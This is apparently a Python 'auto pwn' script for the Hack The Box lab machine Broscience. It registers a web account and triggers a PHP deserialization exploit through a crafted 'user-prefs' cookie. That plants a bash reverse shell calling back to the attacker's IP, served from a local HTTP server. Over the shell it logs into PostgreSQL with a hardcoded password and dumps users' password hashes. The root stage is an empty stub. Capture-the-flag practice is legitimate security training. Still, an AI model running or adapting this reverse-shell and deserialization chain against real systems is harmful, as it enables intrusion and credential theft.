"""
Fully auto pwn HTB: Broscience
"""
from string import ascii_letters, digits
from random import choice
from http.server import HTTPServer, SimpleHTTPRequestHandler
from user_activator import User
from pwn import *
from subprocess import check_output
import requests
import multiprocessing



class BroScience:
    def __init__(self, ip:str) -> None:
        self.attacker_ip = "10.10.14.12"
        self.web_username = "".join(choice(ascii_letters + digits) for _ in range(10))
        self.user_name = "bill"
        self.target = f"broscience.htb"
        self.php_reverse_shell = f"""<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{self.attacker_ip}/1111 0>&1'");"""
        self.l = None
        
        
    def rev_shell_http_server(self):
        '''Start a simple webserver to host reverse shell'''
        print(f"[*] Starting webserver to host reverse shell...")
        www_dir = os.path.dirname(os.path.abspath(__file__)) + "/www"
        if not os.path.exists(www_dir):
            os.mkdir(www_dir)
        os.chdir(www_dir)
        with open("xd.php", "w") as f:
            f.write(self.php_reverse_shell)
        httpd = HTTPServer(('', 80), SimpleHTTPRequestHandler)
        httpd.serve_forever()
        
    def web_login(self, user: User) -> bool:
        data = f"username={user.username}&password={user.password}"
        headers = {"Content-Type" : "application/x-www-form-urlencoded"}
        r = user.session.post(f"https://{self.target}/login.php", data=data, headers=headers)
        if "Logged in" in r.text:
            return True
        return False
    
    def rev_shell_handler(self):
        print("[*] Waiting for reverse shell...")
        self.l = listen(1111)
        _ = self.l.wait_for_connection()
        print("[+] Got reverse shell!")
        # self.l.sendline("python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
        self.l.sendline(b"psql -h localhost -d broscience -U dbuser")
        self.l.recvuntil(b"Password for user dbuser: ")
        self.l.sendline(b"RangeOfMotion%777")
        self.l.sendline(b"select username || ':' || password || ':NaCl' from users;")
        self.l.interactive()
        
        
    def get_user(self) -> bool:
        # Host the php reverse shell
        httpd_proccess = multiprocessing.Process(target=self.rev_shell_http_server)
        httpd_proccess.start()
        
        print(f"[*] Registering web account: {self.web_username}")
        user = User(self.web_username)
        is_created = user.create_account()
        if not is_created:
            print("[-] Failed to create web account.")
            return False

        print("[*] Logging in to web account.")
        # Login to web account so we are able to send payload
        flag = self.web_login(user)
        if not flag:
            print("[-] Failed to login to web account.")
            return False
        
        # Handle reverse shell
        rev_shell_process = multiprocessing.Process(target=self.rev_shell_handler)
        rev_shell_process.start()
        
        # The paylaod to write the reverse shell to web root
        payload = check_output(["php", "payload.php", self.attacker_ip]).decode("utf-8").strip().split("\n")[-1]
        print(f"[*] Payload: {payload}")
        cookies = user.session.cookies.get_dict()
        cookies.update({"user-prefs" : payload})
        
        # Trigger php deserialization exploit
        print("[*] Triggering php deserialization exploit...")
        requests.get(f"https://{self.target}/index.php", cookies=cookies, verify=False)
        # user.session.get(f"https://{self.target}/index.php")
        requests.get(f"http://{self.target}/xd.php", verify=False)
        httpd_proccess.terminate()
        print("[*] HTTP Server terminated.")

        
    def get_root(self):
        pass
    
    
    def auto_pwn(self):
        got_user = self.get_user()
        if not got_user:
            return print("[-] Failed to get user.")
        self.get_root()
        

if __name__ == "__main__":
    htb_ip = input("HTB Network Private IP (ip a): ")
    bro = BroScience(htb_ip)
    bro.auto_pwn()